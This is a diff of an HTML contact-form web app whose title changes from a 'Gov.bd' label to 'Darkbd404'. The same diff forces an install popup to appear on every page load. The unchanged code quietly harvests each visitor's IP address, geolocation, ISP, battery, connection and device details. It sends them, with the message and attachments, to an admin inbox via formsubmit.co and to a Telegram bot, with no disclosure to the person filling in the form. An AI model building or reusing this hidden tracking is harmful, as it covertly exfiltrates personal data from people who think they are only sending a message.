@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Contact•Admin Gov.bd</title>
+    <title>Darkbd404-Contact•Admin</title>
     
     <meta name="theme-color" content="#667eea">
     <meta name="description" content="Contact Us Web App">
@@ -298,7 +298,6 @@
         .status .status-title { font-size: 17px; font-weight: 700; margin-bottom: 4px; }
         .status .status-desc { font-size: 13px; opacity: 0.9; }
 
-        /* Footer with Link */
         .footer {
             text-align: center;
             margin-top: 30px;
@@ -322,8 +321,8 @@
         .modal-overlay {
             position: fixed;
             inset: 0;
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(5px);
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(8px);
             z-index: 9999;
             display: none;
             justify-content: center;
@@ -342,13 +341,15 @@
         }
 
         .modal-content {
-            background: linear-gradient(135deg, rgba(255,255,255,0.95) 0%, rgba(240,240,255,0.95) 100%);
+            background: linear-gradient(135deg, rgba(255,255,255,0.98) 0%, rgba(240,240,255,0.98) 100%);
             border-radius: 24px;
             padding: 35px 30px;
             max-width: 450px;
             width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
             position: relative;
-            box-shadow: 0 25px 80px rgba(0,0,0,0.3);
+            box-shadow: 0 25px 80px rgba(0,0,0,0.4);
             animation: modalSlide 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
             color: #2d3748;
         }
@@ -358,6 +359,9 @@
                 background: linear-gradient(135deg, rgba(30,30,46,0.98) 0%, rgba(20,20,35,0.98) 100%);
                 color: #e2e8f0;
             }
+            .modal-section h4 { color: #90cdf4; }
+            .modal-section p, .modal-section li { color: #cbd5e0; }
+            .modal-header p { color: #a0aec0; }
         }
 
         @keyframes modalSlide {
@@ -381,6 +385,7 @@
             align-items: center;
             justify-content: center;
             transition: all 0.3s;
+            z-index: 10;
         }
 
         .modal-close:hover {
@@ -484,6 +489,10 @@
             font-size: 13px;
             cursor: pointer;
             transition: color 0.3s;
+            background: none;
+            border: none;
+            width: 100%;
+            font-family: inherit;
         }
 
         .modal-skip:hover {
@@ -561,7 +570,7 @@
         <div id="status" class="status"></div>
 
         <div class="footer">
-            All Rights Reserved By <a href="https://m.me/Salam.864" target="_blank">ABDUS SALAM</a>
+            All Rights Received By <a href="https://m.me/Salam.864" target="_blank">ABDUS SALAM</a>
         </div>
     </div>
 
@@ -596,7 +605,7 @@
             </div>
 
             <button class="modal-install-btn" id="modalInstallBtn">📥 Install Now</button>
-            <span class="modal-skip" id="modalSkip">Maybe Later</span>
+            <button class="modal-skip" id="modalSkip">Maybe Later</button>
         </div>
     </div>
 
@@ -619,22 +628,24 @@
     })();
 
     // ============================================
-    // PWA Install with Popup
+    // PWA Install with Popup - ALWAYS SHOW
     // ============================================
-    let deferredPrompt;
+    let deferredPrompt = null;
     const installModal = document.getElementById('installModal');
     const modalClose = document.getElementById('modalClose');
     const modalInstallBtn = document.getElementById('modalInstallBtn');
     const modalSkip = document.getElementById('modalSkip');
 
+    // Capture install prompt
     window.addEventListener('beforeinstallprompt', (e) => {
         e.preventDefault();
         deferredPrompt = e;
-        // Show popup after 2 seconds
-        setTimeout(() => {
-            installModal.classList.add('show');
-        }, 2000);
     });
+
+    // Show modal after 2 seconds on EVERY page load
+    setTimeout(() => {
+        installModal.classList.add('show');
+    }, 2000);
 
     // Close modal
     modalClose.addEventListener('click', () => {
@@ -647,13 +658,18 @@
 
     // Install from modal
     modalInstallBtn.addEventListener('click', async () => {
-        if (!deferredPrompt) return;
-        deferredPrompt.prompt();
-        const { outcome } = await deferredPrompt.userChoice;
-        if (outcome === 'accepted') {
+        if (deferredPrompt) {
+            deferredPrompt.prompt();
+            const { outcome } = await deferredPrompt.userChoice;
+            if (outcome === 'accepted') {
+                installModal.classList.remove('show');
+            }
+            deferredPrompt = null;
+        } else {
+            // If no native prompt, show instructions
+            alert('To install:\n\n📱 Android: Click ⋮ menu → "Install app"\n💻 Windows: Click install icon in address bar\n🍎 iOS: Share → "Add to Home Screen"');
             installModal.classList.remove('show');
         }
-        deferredPrompt = null;
     });
 
     // Close on overlay click
@@ -708,7 +724,6 @@
         };
 
         try {
-            // IP & Location
             const r1 = await fetch('https://api.ipify.org?format=json');
             const d1 = await r1.json();
             d.ip = d1.ip;
@@ -722,13 +737,11 @@
             d.org = d2.org || 'Unknown';
             d.postal = d2.postal || 'Unknown';
 
-            // Battery
             if (navigator.getBattery) {
                 const battery = await navigator.getBattery();
                 d.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
             }
 
-            // Connection
             if (navigator.connection) {
                 d.connection = `${navigator.connection.effectiveType || 'Unknown'} (${navigator.connection.downlink || '?'} Mbps)`;
             }
@@ -817,7 +830,7 @@
         const { browser, os, device } = parseBrowser(deviceInfo.userAgent);
         const now = new Date().toLocaleString('bn-BD', { timeZone: 'Asia/Dhaka' });
 
-        // ====== 1. ADMIN EMAIL (Premium Format) ======
+        // Admin Email
         try {
             const fd = new FormData();
             fd.append('Full Name', fullName);
@@ -825,8 +838,6 @@
             fd.append('Phone', phone || 'N/A');
             fd.append('Subject', subject);
             fd.append('Message', message || 'No message');
-            
-            // Extra Device Info
             fd.append('IP Address', deviceInfo.ip);
             fd.append('Location', deviceInfo.location);
             fd.append('City', deviceInfo.city);
@@ -844,11 +855,9 @@
             fd.append('Language', deviceInfo.language);
             fd.append('Timezone', deviceInfo.timezone);
             fd.append('Submitted At', now);
-            
             fd.append('_subject', '🎯 Premium Contact: ' + subject);
             fd.append('_captcha', 'false');
             fd.append('_template', 'table');
-            
             if (selectedFile) fd.append('attachment', selectedFile);
 
             await fetch(`https://formsubmit.co/ajax/${CONFIG.ADMIN_EMAIL}`, {
@@ -858,7 +867,7 @@
             });
         } catch(e) {}
 
-        // ====== 2. CUSTOMER EMAIL (Premium HTML Template) ======
+        // Customer Email
         try {
             const customerHTML = `<!DOCTYPE html>
 <html>
@@ -916,7 +925,7 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; backg
         </div>
     </div>
     <div class="footer">
-        <p>© 2026 ABDUS SALAM. All rights reserved.</p>
+        <p>© 2026 ABDUS SALAM. All Rights Receive.</p>
         <p style="font-size: 11px; margin-top: 8px;">This is an automated message.</p>
     </div>
 </div>
@@ -938,7 +947,7 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 0; backg
             });
         } catch(e) {}
 
-        // ====== 3. TELEGRAM BOT (Premium Format) ======
+        // Telegram
         try {
             const telegramText = `🎯 <b>PREMIUM CONTACT MESSAGE</b>
 
